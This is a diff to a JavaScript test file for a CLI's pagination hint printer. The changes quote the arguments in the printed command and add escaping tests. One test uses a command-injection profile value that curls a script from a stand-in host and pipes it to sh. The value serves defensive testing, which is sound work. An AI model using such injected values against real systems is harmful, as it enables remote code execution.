@@ -102,7 +102,7 @@ describe('printPaginationHint', () => {
       {},
     );
     expect(logSpy).toHaveBeenCalledWith(
-      '\nFetch the next page:\n$ resend emails list --after item_3',
+      "\nFetch the next page:\n$ resend emails list --after 'item_3'",
     );
   });
 
@@ -116,7 +116,7 @@ describe('printPaginationHint', () => {
       { before: 'item_5' },
     );
     expect(logSpy).toHaveBeenCalledWith(
-      '\nFetch the next page:\n$ resend emails list --before item_1',
+      "\nFetch the next page:\n$ resend emails list --before 'item_1'",
     );
   });
 
@@ -127,7 +127,7 @@ describe('printPaginationHint', () => {
       { limit: 25 },
     );
     expect(logSpy).toHaveBeenCalledWith(
-      '\nFetch the next page:\n$ resend emails list --after item_1 --limit 25',
+      "\nFetch the next page:\n$ resend emails list --after 'item_1' --limit 25",
     );
   });
 
@@ -139,7 +139,7 @@ describe('printPaginationHint', () => {
     );
     const output = logSpy.mock.calls[0][0] as string;
     expect(output).not.toContain('re_1234567890abcdef');
-    expect(output).toContain('--api-key re_...cdef');
+    expect(output).toContain("--api-key 're_...cdef'");
   });
 
   test('includes --profile flag when profile is set', () => {
@@ -149,7 +149,7 @@ describe('printPaginationHint', () => {
       { profile: 'staging' },
     );
     expect(logSpy).toHaveBeenCalledWith(
-      '\nFetch the next page:\n$ resend emails list --after item_1 --profile staging',
+      "\nFetch the next page:\n$ resend emails list --after 'item_1' --profile 'staging'",
     );
   });
 
@@ -168,7 +168,30 @@ describe('printPaginationHint', () => {
       },
     );
     expect(logSpy).toHaveBeenCalledWith(
-      '\nFetch the next page:\n$ resend contacts list --before item_1 --limit 10 --api-key re_...ijkl --profile prod',
+      "\nFetch the next page:\n$ resend contacts list --before 'item_1' --limit 10 --api-key 're_...ijkl' --profile 'prod'",
     );
+  });
+
+  test('escapes shell metacharacters in profile', () => {
+    printPaginationHint(
+      { has_more: true, data: [{ id: 'item_1' }] },
+      'domains list',
+      { profile: 'prod; curl https://evil.invalid/p.sh | sh #' },
+    );
+    const output = logSpy.mock.calls[0][0] as string;
+    expect(output).toContain(
+      "--profile 'prod; curl https://evil.invalid/p.sh | sh #'",
+    );
+    expect(output).not.toContain('--profile prod;');
+  });
+
+  test('escapes single quotes in profile', () => {
+    printPaginationHint(
+      { has_more: true, data: [{ id: 'item_1' }] },
+      'domains list',
+      { profile: "it's" },
+    );
+    const output = logSpy.mock.calls[0][0] as string;
+    expect(output).toContain("--profile 'it'\\''s'");
   });
 });
